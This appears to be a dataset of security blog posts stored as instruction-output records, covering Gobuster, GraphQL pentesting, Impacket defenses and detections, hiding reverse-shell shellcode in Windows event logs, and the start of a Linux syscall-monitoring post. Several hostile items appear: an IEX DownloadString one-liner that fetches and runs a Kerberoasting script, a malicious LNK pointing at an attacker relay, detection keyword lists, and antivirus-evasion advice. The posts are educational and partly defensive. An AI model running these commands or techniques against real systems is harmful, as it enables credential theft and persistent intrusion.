Gobuster\n\nBecause the web server used in this example was bare-bones, the simplest possible gobuster commands returned interesting, easy-to-parse output. This will typically not be the case for production web servers. Some of the more commonly used Gobuster arguments include:\n\n--user-agent: Increase the likelihood that the web server will return a valid response by using a browser\u2019s user agent string.\n\n\u2013timeout: Increase the timeout duration to decrease the likelihood of missing pages hosted by slow-to-respond servers.\n\n--no-tls-validation: Do not require validation of TLS.\n\n--exclude-length: Do not show results for HTTP responses of a specified length.\n\n--status-codes: Specify which HTTP response codes should be interpreted as the web application returning a valid file. This can reduce false negatives.\n\n--status-codes-blacklist: Specify which HTTP response codes should not be interpreted as the web application returning a valid file. This can reduce false positives.\n\nAs always, make sure that you have permission to test the targeted web applications before running these tools!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lessons Learned While Pentesting GraphQL\"\nTaxonomies: \"How-To, Web App\"\nCreation Date: \"Wed, 06 Jul 2022 20:24:06 +0000\"\nSean Verity //\n\nGraphQL is one of those technologies that I heard about several years ago but had not encountered during an actual pentest. After reading a blog or two, I remember thinking \u201cJSON, database queries, got it\u201d and then I moved on. I didn\u2019t see GraphQL during an actual pentest until about a month ago.\n\nThere were a few pain points that I worked through to bootstrap my GraphQL pentesting chops. Hopefully, I can help you avoid these same pain points when you come across GraphQL for the first time during a pentest, bug bounty hunt, or CTF.\n\nThere are several tools out there. I started out doing things manually, which is good to learn GraphQL, but gets really hard, really fast when you start getting into something beyond a very basic GraphQL query. Therefore, I\u2019m going to suggest using a tool that can automate, or at the very least, create queries that are good from a syntax perspective. \n\nThis blog also assumes that GraphQL introspection is enabled. There are tools to enumerate GraphQL schemas when introspection is disabled but that is outside the scope of this blog. But, in case you need one, here you go:\n\nhttps://github.com/nikitastupin/clairvoyance\n\nHow to Find GraphQL\n\nThe easiest way to find GraphQL is to look at your Burp History logs. In the HTTP History tab, filter by the search term, \u201cgraphql,\u201d and see if anything pops up. You could also search your target in the \u201cSite map\u201d tab for \u201cgraphql\u201d. If the app is using GraphQL on the frontend, you\u2019ll see an endpoint that includes \u201cgraphql\u201d somewhere in a URL.\n\nBut what if GraphQL wasn\u2019t intended to be exposed?\n\nWell, there\u2019s a GraphQL SecList for that! Feed the GraphQL SecList to Gobuster or your favorite forced browsing tool for effect. (BTW \u2013 Did you see our recent blog on Gobuster? https://www.blackhillsinfosec.com/for-web-content-discovery-who-you-gonna-call-gobuster/)\n\nSpeaking GraphQL\n\nAfter finding GraphQL, one of the first things you might want to do is send the request to Burp Suite's Repeater tab for further analysis. One thing that jumped out for me is that GraphQL is VERY transparent. Take a look at the following error message:\n\nThere\u2019s actually a few things wrong with this query, but from reading the error message, it is plainly obvious where we can start to fix it.\n\nGraphQL also has this wonderful feature called \u201cintrospection.\u201d GraphQL\u2019s introspection feature is a convenient way for GraphQL to share details about itself with other developers or consumers of the GraphQL instance. When introspection is enabled, the entire GraphQL schema can be retrieved with a single query. This provides a significant advantage to pentesters, bug bounty hunters, or anyone looking for vulnerabilities.\n\nThe GraphQL visualization tool, graphql-voyager, can import a GraphQL schema and turn it into a map with nodes and edges. This can be a nice way to get an overview of the types, queries, and size of the schema. Here\u2019s a snippet from an example GraphQL schema that describes a popular movie franchise set in a galaxy far, far away:\n\nAs a side note, the first time I saw GraphQL during a pentest, I imported a schema into graphql-voyager and started writing GraphQL queries in Repeater from scratch. This was fun from a learning perspective and was no big deal for simple queries. I quickly realized that this approach was unsustainable though as I dug further into the schema where there were more complex queries. It was really easy to include a misplaced curly brace.\n\nAnd then I learned about this awesome project called InQL (Introspection Query Language). InQL can retrieve a GraphQL schema from a remote server through GraphQL\u2019s introspection feature and parse it into request templates. InQL can also import a file if you have the schema saved on disk. InQL can be run as a CLI tool or as a Burp Suite extension. Running InQL as a Burp Extension offers the benefit of a workspace where you can copy and paste the request templates into other tools such as Repeater or Intruder for further testing.\n\nInstalling the InQL Burp Suite Extension\n\nInstalling the InQL Burp Suite extension is as simple as searching for it in the BApp store and clicking the install button.\n\nYou might be wondering why I searched for \u201cgraphql\u201d in the BApp Store as opposed to \u201cinql\u201d. During a test, I\u2019ll often search for a particular technology or thing in the BApp Store (e.g. JavaScript, secrets, Node, etc.) as opposed to searching for a tool. I have found this to be helpful in the situation where I\u2019m running into issues with a particular extension and I need an alternative that works.\n\nAfter installing InQL, fetching a schema is as simple as copying the GraphQL endpoint into the address bar and clicking the \u201cLoad\u201d button. It might take a few seconds for the schema to load. Upon completion, the interface should look similar to below.\n\nThe schema in the screenshot above was grabbed from Damn Vulnerable GraphQL Application. As can be seen in the figure above, the InQL will parse the schema into queries, mutation, and subscriptions. InQL will also do you the favor of documenting the associated fields and arguments in request templates.\n\nWhen you come across GraphQL during a pentest, you might find subscriptions, but you will almost certainly come across queries and mutations. Queries, as you likely guessed, will fetch data from the GraphQL data store. I like to think of mutations as functions because their purpose is to modify data in the GraphQL data store. Both queries and mutations can accept arguments which are good to fuzz.\n\nAfter you load a schema into InQL, you can inspect the objects and copy the request templates from InQL to Repeater for further testing.\n\nWhen you copy request templates from InQL to Repeater, pay attention to which tab you copied from. Copying a request template from the GraphQL tab into Repeater will not work.\n\nHowever, you can copy a request from the \"Raw\" tab into the body of a POST request in Repeater.\n\nOk, so actually, when InQL is installed, an extra tab is included in Repeater to paste or tweak your GraphQL queries. The important thing to remember though is that you need to put the right query format into the right Repeater tab. In the example below, a GraphQL query from InQL was copied into the GraphQL tab in Repeater.\n\nWhen querying the systemHealth type, we see a reasonable response. As a basis for comparison, here\u2019s what happens when you accidentally put a \u201craw\u201d query into the GraphQL query tab.\n\nNow look at that beautiful error message. Isn\u2019t that nice? Even though the query was not formatted correctly, GraphQL is generous enough to respond with a helpful error message that you can use to troubleshoot.\n\nFrom this point, you could continue manually testing with Repeater, or send it to Intruder for fuzzing. Think of the GraphQL API as a roundabout way of interacting with the application\u2019s back end. Here are a few hacking ideas:\n\nStriking out on fuzzing \u201cnormal\u201d requests? Try fuzzing the GraphQL queries / mutations and their arguments.\n\nIs the app doing a good job at preventing brute forcing? Find a query or mutation that accepts a password as an argument and see if there\u2019s brute force prevention there. More on this topic here: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel\n\nLook at all the queries and mutations that look interesting and try them out. You might get lucky and come across a query that reveals secrets about the application.\n\nOther GraphQL Testing Tips\n\nFound a query that needs arguments?\n\nSearch Burp History for the arguments. Search for substrings or variants of what\u2019s in the schema. As an example, the schema might have enumerated an argument named \u201cfooBar\u201d. Try searching for \u201cfoo\u201d in Burp History in case the front end uses a different naming convention such as \u201cfoo_bar\u201d. See if Burp\u2019s Target Analyzer uncovered GraphQL arguments for you as well. In the Sitemap tab, right-click on the target\u2019s base node, then choose \u201cEngagement Tools > Analyze Target\u201d.\n\nWatch for error messages in the GraphQL response. GraphQL will clearly tell you what is wrong with your query. You may have forgotten an argument or passed an integer when it expected a string, etc.\n\nTake Modern WebApp Pentesting w/ BB King. Other testing techniques that will come in handy for testing GraphQL (such as NoSQL injection) are covered.\n\nTroubleshooting\n\nOne of the most frustrating things that I encountered when testing GraphQL was when a query would work and then the next day, it didn\u2019t.\n\nThe problem was usually pretty simple and easy to overlook. Here are a few things to check if you\u2019re in that situation:\n\nMake sure you\u2019re sending a POST request. A GET request might trigger an error message to tip you off that GraphQL is present. But, you gotta use POST requests for valid queries.\n\nMake sure that the following request header is present: Content-Type: application/json\n\nRead error messages in the response and modify your request accordingly.\n\nDouble-check which context you pasted a query into. GraphQL queries can only be pasted into the GraphQL context in Repeater. Raw requests will not work when pasted into the GraphQL context in Repeater.\n\nIf you don\u2019t see the \u201cInQL\u201d dropdown option in Repeater: Copy a query from InQL into \u201craw\u201d format into a POST request in Repeater, then click Send. This will usually bootstrap the InQL context in Repeater.\n\nGraphQL Security Testing Resources for Further Learning\n\nhttps://github.com/doyensec/inql\n\nhttps://ivangoncharov.github.io/graphql-voyager/\n\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection \n\nhttps://github.com/dolevf/Damn-Vulnerable-GraphQL-Application\n\nhttps://www.antisyphontraining.com/modern-webapp-pentesting-w-bb-king/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Impacket Defense Basics With an Azure Lab\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Jordan Drysdale, Azure, defense, Detection, doazlab.com, Impacket, Jordan Drysdale\"\nCreation Date: \"Tue, 26 Jul 2022 17:06:57 +0000\"\nJordan Drysdale //\n\nOverview\n\nThe following description of some of Impacket\u2019s tools and techniques is a tribute to the authors, SecureAuthCorp, and the open-source effort to maintain and extend the code. This is a follow-up to my \"Impacket Offense Basics With an Azure Lab\" article, and is going to take the other perspective of trying to detect and defend against these techniques.  \n\nhttps://github.com/SecureAuthCorp/impacket \n\nLab Setup\n\nARM template here: doazlab.com or github.com/DefensiveOrigins/DO-LAB  \n\nAuthenticate to an Azure subscription where you can construct resources. Deploy lab. \n\nDomain controller and joined workstation \n\nUbuntu \n\nPreventative Deception \n\nThis section will provide some basic commands for creating a couple of controlled objects in Active Directory. These objects will help us detect a few common attacks later.  \n\nThe Deploy-Deception toolkit deserves some credit, and while the repo is a few years old, the material is still relevant. Some of the most basic detections, like object attribute reads by an attacker against controlled objects (or Kerberoasting them), can reduce our mean time to detection. \n\nGitHub: https://github.com/samratashok/Deploy-Deception \n\nBlog: https://www.labofapenetrationtester.com/2018/10/deploy-deception.html  \n\nThe Luis account below is being created to facilitate some enumeration-type and Kerberoasting detections later.  \n\nNew-ADUser -UserPrincipalName Luis.Graves@doazlab.com -Path \"OU=DomainUsers,dc=doazlab,DC=com\" -GivenName \"Luis\" -Surname \"Graves\" -Enabled 1 -Name \"Luis.Graves\" -desc \"Accounting Controller\" -office \"Accounting\" -title \"Controller\" -company \"DevLabs\" -AccountPassword (ConvertTo-SecureString \"Password1!\" -AsPlainText -Force) -Credential $Cred \n\nThe account should have landed in the DomainUsers OU under the root of the domain.  \n\nThis account will be useful later, I promise.  \n\nNtlmrelayx.py\n\nDefending against expansive toolkits like ntlmrelayx can be a challenge. You thought the Impacket libraries were extensive? There\u2019s like 300 different combinations of attack options for just ntlmrelayx.\n\nThe defense scenario below attempts to mitigate Mitre ATT&CK 1204: Malicious Link. The LNK attack basically relies on a listening relay that is targeted by the LNK shortcut file. \n\nhttps://attack.mitre.org/techniques/T1204/001/\n\nSo, in my opinion and at the time of writing (July 16, 2022), the mitigations outlined under the MITRE ATT&CK framework are insufficient to protect a domain\u2019s file shares from the LNK and URL attack vector.\n\nNetwork intrusion prevention comes up short under the following assumptions. \n\nThe adversary is trying to escalate privileges but is already working under a domain user\u2019s compromised context.  \n\nLeaving an LNK or URL artifact on a file will likely go undetected without Microsoft\u2019s File Server Resource Manager1 or similar technology. \n\nThe mission of an adversarial LNK file is not to download but instead to trigger silent authentication to the adversary relay.  \n\nAnyway, I am failing to connect the dots with this mitigation and reality on the ground.  \n\nMitigation ID M1021, Restrict Web-Based Content, also suffers from the same reality that once an end user is compromised, their file shares become a soft target. As a pentester, I am not looking for web access, web services, or anything related to TCP/80 or TCP/443 after landing on a domain joined system. File shares == web protocols?!? Strange. \n\nFinally, the M1017 recommendation to train users is misplaced. A user browsing a file share interacts with the LNK file silently. Looking at an LNK\u2019s target path in the command below, we can see it is pointed at an IP address elsewhere. \n\nPS C:\\> $lnk = $objShell.CreateShortcut(\"c:\\file6\\malicious.lnk\") \n\nPS C:\\> $lnk.TargetPath = \"\\\\10.0.0.8\\@threat.png\" \n\nThus, if there is a training target here, it is all of IT operations on the nature of these files. Repeating \u2013 browsing a file share with the above LNK file will trigger silent Windows domain credential submission to the attacker (password hash). If a DA browses this share, the DA creds are submitted to the attacker\u2019s relay. An end user browses the share, their domain credential material is sent to the attacker. There is nothing to teach the end user here... unless I am missing something.  \n\nDetect?  \n\nYou could just detect and alarm on the file creation event using Sysmon. It really is just as easy as creating a match against .URL and .LNK files - BOOM \u2013 easy win (oh yeah, this gets caught by default using the legendary Olaf\u2019s Sysmon-Modular).2 No Sysmon? Check your EDR and its capabilities. Windows event ID 4656 could drown your organization in log volume, so from an advice perspective, it would be difficult to enable \u201cAudit Object Access\u201d efficiently. \n\nDefense?  \n\nThis was made simple by Microsoft with FSRM. This allows a share administrator to limit the file extensions allowed. That simple? Yeah. You should try it sometime; it works.  \n\nYou can make this even easier by narrowing the focus of your file shares. If your domain lacks a cohesive workstation firewall policy, you probably have file shares you do not know about. Workstation firewalls will reduce the open share footprint on your network, reduce openings for adversaries using SMB RPC3 to facilitate additional attacks, and is another better security practice that can reduce risk. \n\nOne more thing \u2013 know your egress exposure and check it often. You should reduce your outbound port exposures to avoid hashes getting shipped to an adversary outside your networks.  \n\nThe next defense scenario attempts to mitigate Mitre ATT&CK T1557: Adversary in the Middle. \n\nhttps://attack.mitre.org/techniques/T1557/001/\n\nFrom the LNK attack perspective, the adversary in the middle is parked somewhere on your network or domain as a relay. When an end user browses the LNK\u2019d share, their creds are sent to the adversary in the middle (AiTM) who forwards the creds along to whatever target makes sense in context.  \n\nLLMNR and NBNS poisoning is a different animal and has been described in such exhausting detail over the years4 that it is shocking these protocols have not been patched out by Microsoft (maybe they have). Anyway, the Windows computer fails to identify a valid name to IP map and chooses to spew broadcast and multicast traffic all over the subnet... Our AiTM hears, responds, receives creds, profits $$$.  \n\nThis next defense technique is intended to match against an older version of the Mitre ATT&CK technique T1136: Add a Domain Account.  \n\nhttps://attack.mitre.org/techniques/T1136/002/\n\nMitigations?  \n\nThese are basically moot when going up against NTLM relay via malicious URL, LNK, or LLMNR. The adversary is already in the post-exploitation phase of this attack.  \n\nMFA? Not likely going to help against an LDAP DCE RPC5 attack. Network segmentation? Are you planning to allow end users and computers to authenticate against the domain? I thought so, thus you cannot segment off LDAP...strange mitigation. Patch your DCs! /obvs, but LDAPs and channel binding is what you really want here. Finally, PAM. Yay! Yeah, do this too. Keep your domain admins from interacting with anything except the domain controller and only under controlled conditions. \n\nDetections? \n\nBoth command and PowerShell transcription are required these days. You will not survive a pentest without knowing what is going on across your infrastructure\u2019s terminals. Catch net commands! Catch IEX, invoke, bypass, github, and a bunch of other dangerous terms that you might see in CLI log events. \n\nWindows event ID 47206 and 4722 should be monitored closely. These will describe account creation events.  \n\nDefense?  \n\nCheck your ms-ds-machine-account-quota attribute in Active Directory. If this value is at default, it means that any domain user can add up to 10 computers to the domain. This value should be zero and the activity should be controlled by appropriately delegated systems administrators.  \n\nGetADUsers.py \n\nDomain enumeration is common enough, adversarial activity, IT operations, pentests, that having a decoy account to notify the team is worth the time to deploy, alert, and monitor. Better to know someone ran SharpHound, ADExplorer, or GetADUsers.py than exist in the blind state way too many organizations are operating under. \n\nSo, this defense technique could be referenced in MITRE ATT&CK as T1087, Account Discovery: Domain Account. This is basic enumeration in the attack technique matrix. \n\nhttps://attack.mitre.org/techniques/T1087/002/\n\nLet\u2019s run the deception tool mentioned earlier and add an account that we will specifically monitor and alert against any time the user\u2019s attributes are enumerated. \n\niwr -URI https://github.com/DefensiveOrigins/Deploy-Deception/archive/refs/heads/master.zip -outfile deception.zip \nexpand-archive deception.zip \nrm deception.zip \nmv .\\deception\\Deploy-Deception-master\\* .\\deception\\ \ncd deception \nSet-ExecutionPolicy bypass -Force \nImport-Module .\\Deploy-Deception.ps1 \nCreate-DecoyUser -UserFirstName DOLabs -UserLastName AnyRead -Password Password1! \nDeploy-UserDeception -UserFlag PasswordNeverExpires \u2013Verbose\n\nThe next piece of this detect and alert puzzle requires that we gather the ObjectGUID from the object\u2019s AD attributes. \n\nGet-ADUser -Identity DOLabsAnyRead -Properties \"ObjectGuid\" \n\nOnce you have the GUID, build your detection logic where the Windows event ID is 4662 and the GUID we gathered from our decoy. \n\nRun BloodHound, ADExplorer, GetADUsers, whatever enumeration tool fuels your engine. In Sentinel, I get a detection.  \n\nGet-GPPPassword.py \n\nThis attack maps against MITRE ATT&CK, a sub-technique under T1552, Unsecured Credentials: Group Policy Preferences.  \n\nhttps://attack.mitre.org/techniques/T1552/006/ \n\nThe recommended mitigations here align with reality. \n\nDefense? Detection? \n\nYou should catch this activity if it is performed via CLI or PS. If any terms in your transcription logs align with cpassword, file an incident and get investigating.  \n\nGetUserSPNs.py \n\nThe GetUserSPNs.py class was designed to gather Kerberos ticket hashes from a domain. This attack is classified as a sub-technique of MITRE ATT&CK T1558, Steal or Forge Kerberos Tickets.  \n\nhttps://attack.mitre.org/techniques/T1558/003/ \n\nThis one is great! Let\u2019s add an SPN to Luis\u2019 account which we created earlier and use that account to detect kerberoasting. \n\nsetspn -a ws05/luis.graves.doazlab.com:1433 doazlab.com\\luis.graves \n\nRoast \u2018em! \n\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat john \n\nThe ticket byte hex stream was chopped for brevity. \n\nWe did catch this activity. This is an IoC. This was an easy win. Create and alert on this type of activity. \n\nDefense? \n\nSeriously strong passwords. I am not talking about long organization-related scrapable or dictionary type passwords. I am talking 25 characters or more, multiple words, or randomized and PAM managed passwords. \n\nManaged service accounts. Standalone MSAs are easy to deploy. Group MSAs (gMSAs) are a bit more challenging but are designed for clustered systems like database servers.  \n\nSecretsdump.py \n\nThis attack aligns with MITRE ATT&CK T1003, OS Credential Dumping. \n\nhttps://attack.mitre.org/techniques/T1003/003/ \n\nMitigations? These mitigation IDs are great advice. Read the section on MITRE.  \n\nDetections?  \n\nWhat about the RemoteRegistry service? Most of the tools that interact with LSA and attempt to capture the SAM table use an SMB remote process/procedure call to start this service. Once the service is started, additional operations are performed using it. I almost forgot to include this detection, thus the old screenshot below. However, you should treat Windows event ID 4688 with invocations to start the RemoteRegistry service as worthy of investigation. \n\nThe second Secretsdump.py invocation is the NTDS.dit capture. This has the same parent technique, T1003, OS Credential Dumping, but is a different sub-technique. In this case, the MITRE sub-technique is listed as DCSync.  \n\nhttps://attack.mitre.org/techniques/T1003/006/ \n\nDetections?  \n\nAll DCsync operations performed by a non-DC should be scrutinized like the organization\u2019s intellectual property depended on it. This should raise flags across IT operations. All hands on deck! \n\nDefenses?  \n\nSecretsdump can be limited with workstation and server firewalls. Often, the intermediate jump to DA has 445 open, which allows SMB RPC access to LSASS. This access allows the compromise of an admin and may open additional paths across a network.\n\nThanks for reading. \n\n-jd \n\nReferences\n\n1. https://docs.microsoft.com/en-us/windows-server/storage/fsrm/fsrm-overview\n\n2. https://github.com/olafhartong/sysmon-modular\n\n3. https://www.thehacker.recipes/ad/recon/ms-rpc \n\n4. https://www.blackhillsinfosec.com/how-to-disable-llmnr-why-you-want-to/\n\n5. https://ldapwiki.com/wiki/DCE-RPC \n\n6. https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4720\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Windows Event Logs for Red Teams\"\nTaxonomies: \"Author, How-To, Red Team, Red Team Tools, Tim Fowler, Event Logs, Fileless, Injection, Logging, Payloads, shellcode\"\nCreation Date: \"Mon, 08 Aug 2022 15:17:06 +0000\"\nTim Fowler // \n\nDo you know what could be lurking in your Windows event logs?\n\nIn May of 2022, I was sent a Threat Post article about a new technique that had been discovered in the wild for maintaining persistence using Windows event logs. I immediately started skimming the article, which can be found here: https://threatpost.com/attackers-use-event-logs-to-hide-fileless-malware/179484/ and the original Kaspersky report here: https://securelist.com/a-new-secret-stash-for-fileless-malware/106393/. I found myself both surprised and frustrated at how simple it was to leverage Windows event logs for storing offensive payloads that could in turn be used to maintain persistence.\n\nAt the time the article was published, I was in San Diego for WWHF: Way West 2022, so I planned to take a deeper dive into the subject once I returned home.\n\nFast-forward a few weeks, I finally had some time that I could circle back to the article and really dive in and try to figure out what was going on, how it all worked, and what (if any) were the limitations of using Windows event logs as a payload storage apparatus.\n\nFor me, the most logical place to start getting a better understanding of how it worked was understanding some important details \u2014 basics really \u2014 about how event logs work within Windows. I won\u2019t bore you with a lot of mundane details, but it is important to understand some of the basics, especially around the creation of event logs and how it impacts using the logs for offensive purposes.\n\nWindows Event Log Basics\n\nThe Windows event log contains logs from the operating systems, services, and applications such as Office and SQL Server. The logs use a structured data format that make them easy to search and analyze. \n\nThe easiest means of accessing the Windows event log is to use Event Viewer (evetvwr.exe).\n\nThe primary logs for Windows systems are in the Windows Log, and within that folder are five categories that are standard on all Windows systems.\n\nApplication\n\nSecurity\n\nSetup\n\nSystem\n\nForwarded Events\n\nThere is also a collection of logs in a folder within Event Viewer called Application and Services Logs that contains logs of individual applications and hardware-based events. Windows PowerShell logs would be found in this collection.\n\nEach log entry is formatted with specific fields that allow for a common structure. The following fields are some of the most filtered fields for log analysis:\n\nLog/Key <-- e.g. Application\n\nSource <-- e.g. Outlook\n\nDate/Time\n\nEventID\n\nTask Category <-- Application defined\n\nLevel\n\nComputer\n\nEventData <-- Message and Binary Data\n\nWindows Event Log \u2013 User Constraints\n\nAre you a local admin? Just a regular user?\n\nCertain event logs can only be written to if you\u2019re a local administrator, others are writeable by everyone. While not super important for this blog post, depending on the use of the technique later in this post, these constraints on users not being able to write to certain logs could come into play.\n\nShown below is a nice chart of the permission users have regarding the various event logs found on a common Windows installation.  \n\nIf it is not already obvious, let me state it for the record that to be able store a payload in an event log entry, you must first be able to write to the event log. Depending on your user context, you may not be able to write to some logs such as the System log, unless you are operating in the context of a local administrator.\n\nWindows Event Log \u2013 Size Constraints\n\nOne other constraint to be aware of is that there is a size limitation on the amount of data that can be stored in an event log, based on the maximum character limitation of the Event message string of 31,839 characters.\n\nNow that all the basics are covered\u2014 Oh wait, one more thing\u2026\n\nNot only is it possible to create arbitrary event log entries, if you are a local administrator, you can also create entirely new event logs. Hold on to this, as we will come back to it.\n\nNow the basics are done, and we can jump in and start creating some event log entries.\n\nUsing PowerShell and the Write-EventLog commandlet, it is simple to create arbitrary event entries with the following command:\n\nWrite-Event -LogName $1 -Source $2 -EventID $3 -EventType Information -Category 0 -Message $4\n\nThere are a few things to be aware of though. First, the -LogName argument must be a valid log for which your user context can write to, and secondly, the -Source argument needs to be a source that is registered as a source to the specific log in the Windows registry.\n\nIn the registry, you will find the EventLog Logs located at Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\ and within each of those keys, you will find a list of sources that have been registered to that event log. As shown above, we chose to use the event log Application and the source Edge, since Edge was valid source, registered to the event log.\n\nFor the purpose of demonstration, we chose an arbitrary EventID of 31337, but you can use any EventID of your choosing. But, as shown shortly, choosing a valid EventID can help limit the indicators that something is mucking about in the log.\n\nWhen creating an event log entry, you will need to define the EntryType using the -EntryType argument. There are five types that can be used but if you are trying to not get caught, the information type is probably the best option.\n\nNext to last, there is the Category, which is an application defined field used to aid in filtering logs. Here we set it to 0, which equates to None when viewed in Event Viewer.\n\nLooking in Event Viewer, we can see that our event log entry was successfully created in the Application log with the Event ID of 31337 and the message, Here be dragons.\n\nOne thing to note is that if you used the previous command to create a log entry for yourself, you would see the following text in the log message before our user-supplied message of Here be dragons:\n\nThe description for Event ID 31337 from source edge cannot be found. Either the component that raises this event is not installed on your local computer or the installation is corrupted. You can install or repair the component on the local computer.\n\nIf the event originated on another computer, the display information had to be saved with the event.\n\nThe reason this message is prepended to our user-supplied message is that in the registry key for the source Edge, there is an attribute called EventMessageFile that points to a DLL file that contains the event messages associated with the source. In our case, we provided an event ID that was not found in the EventMessageFile and thus resulted in the message we saw for our log entry in Event Viewer.\n\nIf you are trying to stay under the radar and undetected, it is advised that you only use sources and subsequent event IDs that are related. It is not common for an event source to generate this sort of message in normal day-to-day event log entries, so messaging could raise suspicion if the event is observed by an analyst.\n\nHaving shown that it is trivial to create event log entries, the next step is to figure out how and where to inject a payload.\n\nIf you remember back to the Windows Event Log Basics, the EventData field of an entry supports both a message and binary data. By simply adding one more argument to our PowerShell command, we can include binary data in the event log entry by using the -RawData argument.\n\nTo be able to embed binary data in our log entry, we must pass it to the Write-EventLog commandlet as a byte array. There are many methods that one could use to do this, but I chose to convert a hex literal string containing my data into a byte array then passed that variable to the -RawData argument.\n\nPulling up the new log entry and clicking on the Details tab, we find that the binary data we included is stored nicely for us to see in byte form, as well as the ASCII version of the data.\n\nBam! We now have user-defined binary data stored in a log entry. I think you can see where this is headed\u2026\n\nThe logical next step is to include an actual payload in a log entry and not just some text. To start, I generated a simple Windows exec payload using msfvenom using the output format as hex literal string.\n\nNext, we must create a new event log entry with the payload string from above. To replicate the actions of the threat actor using this technique, instead of using the Application log and source of Edge, we used the Key Management Service log and the source KmsRequests, as shown in the image below taken from Kapersky\u2019s SecureList article.\n\nhttps://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/04/28153130/SilentBreak_APT_toolset_01.png\n\nLooking back in the Event Viewer, we can see that our log entry was created and our binary payload is stored safely inside.\n\nThis is awesome, but we have an issue; we have a stored payload but no way to use it yet. Payload retrieval time.\n\nThere are probably about 14,598,231 ways to approach pulling the payload from the event log entry we created, but given that we need to also execute the payload, I opted to use a simple C# program that would search for long entries with the eventId of 31337 in the Key Management Service log, and then pull the binary data from said entry.\n\nThe following code is a very basic, and grossly written proof-of-concept, that pulls the binary payload data from the first entry in the event log Key Management Services, then executes that binary payload using a very common shellcode injection technique that will inject the payload into the current running process.\n\n The code used for this proof-of-concept can be found on GitHub here: EventLogForRedTeams\n\nAfter compiling the PoC code with Visual Studio, we can execute the program, popping calc.exe from a stored binary payload in an event log.\n\nThe astute among us will notice that the code did throw a supposedly fatal error, but it did not prevent the successful execution of calc.exe. Remember this code was designed to barely function as a PoC, so the fact that there was only one fatal error is a win in my book.\n\nWell, there it is, binary payloads stored in Windows event logs\u2026 wait, what? You want more? I figured as much, so buckle up and here we go.\n\nPopping calc.exe is all well and good, but we can do much more than that leveraging this technique. How about a remote shell? Metasploit, you say? In 2022, surely not. Let\u2019s try it.\n\nFirst, we need to generate a new payload using msfvenom. I opted to use the payload windows/x64/shell_reverse_tcp for this, mostly because I feel like any Metasploit payload is a crapshoot in 2022, but I have found that stageless payloads have a higher chance of success (but your mileage may vary).\n\nAfter creating the hash literal string of our new payload, I had to create a new event log entry using the new payload.\n\nDue to the simplistic approach the C# code takes to find the payload in the event logs, it will only pull binary data from the first entry found in the log, so I cleared the Key Management Service log before moving on.\n\nWith the log cleared of entries, I could create my new log entry with the updated binary payload. As shown in the image below, our payload was once again safely stored in the event log entry, just waiting for something to use it.\n\nThe last step was to setup an nc listener using -nvlp 1337 as arguments. With our listener setup, it was time to execute our program to inject our shellcode and hopefully get a remote connection. To facilitate this, I SSH\u2019d into a Kali Linux virtual machine from the Windows virtual machine to run the listener.\n\nAs shown in the image above, a session was successfully established on the Windows 11 Pro host, with Windows Defender running and no settings turned off.\n\nVictory!!!\n\nWell, almost\u2026\n\nYou see, when I started this research effort, everything just basically worked as expected. Windows Defender was completely blind to most Metasploit payloads, and it was a lot of fun. Then something changed, and Defender started to catch the injected payloads after a session had been established and then eating the payload injector.\n\nNone of this is surprising, especially since there are zero obfuscation efforts going on to hide what payloads are being used and how they are being used. Just vanilla, out-of-the-box Metasploit in 2022. However, it just goes to show that there is great potential in using the log entry injection technique for storing payloads.\n\nIn fact, a few moments after the previous screenshot was taken, Defender rose its head and gobbled up our injector, killing our session.\n\nLike most things in life, if you put a little effort into and try to understand what is going on around you, amazing things can happen like a Cobalt Strike Beacon running on a fully patched Windows 11 Pro System with zero obfuscation.\n\nHint: HTTPS Beacons work better right now\n\nSo, I ask again, what is lurking in your Windows event logs? Shellcode? Possibly. If not today, maybe tomorrow. As I have shown, it is trivial to inject a malicious payload into an event log entry and retrieve it later for execution. While this post did not touch on anything beyond the basics, I am sure if you made it to this point, you already have ideas of how this could be leveraged for establishing persistence and more.\n\nIf you would like to play around with this technique more, specifically as a persistence method, I would suggest you check out a tool from Improsec on Github (found here: SharpEventPersist) that allows you to establish persistence using event log injection with Cobalt Strike\u2019s execute-assembly.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Linux System Call Monitoring\"\nTaxonomies: \"Informational, C, Linux, Linux Kernel\"\nCreation Date: \"Tue, 13 Sep 2022 16:37:36 +0000\"\nmoth //\n\nI've been diving deep into Linux lately, with my latest kick being exploring the Linux kernel. I've found \"The Linux Programming Interface\" (TLPI) by Michael Kerrisk, among others, to be a fantastic reference manual that covers the application of system calls (syscalls). For a quick primer on Linux syscalls, check out the introductory Linux manual page on the subject by using the man 2 intro command in a terminal (or viewing the page online). While reading through TLPI, I found myself yearning for a deeper exploration into the implementations of the syscalls themselves. To that end, I've lately been reading a lot of kernel source code and chaining bits of code together to get a better understanding of what some things do. My first port of call was a way to detect when a given syscall was used and a way to see what information was passed to it before it was executed. As an extension of the overarching adventure, I ultimately wanted to have a Loadable Kernel Module (LKM) that would listen for a given syscall and, at the very least, log that the syscall was observed. Ideally, the module would also print some detailed information about the call's arguments. What I've ended up with is a piece of code that I can extend to monitor arbitrary syscalls, as well as a mechanism to investigate Linux kernel security. \n\nKprobes\n\nSome initial research led me to a kernel tracing facility called Kprobes, which can be used to hook most kernel symbols. From what I understand, registering a kprobe in the kernel causes it to be inserted immediately before the target symbol in memory, saving the symbol's information in the process. The registered kprobe then executes any code written in kp->pre_handler, runs the instruction, then executes whatever you may have written in an optional kp->post_handler. I think the Kprobes facility is wicked cool, and I will certainly return to it at some point, but it wasn't immediately useful (or so I thought) in giving me a look into when specific syscalls are used, and my initial probing resulted in mostly garbage in the log.\n\nKallsyms\n\nMore research eventually led 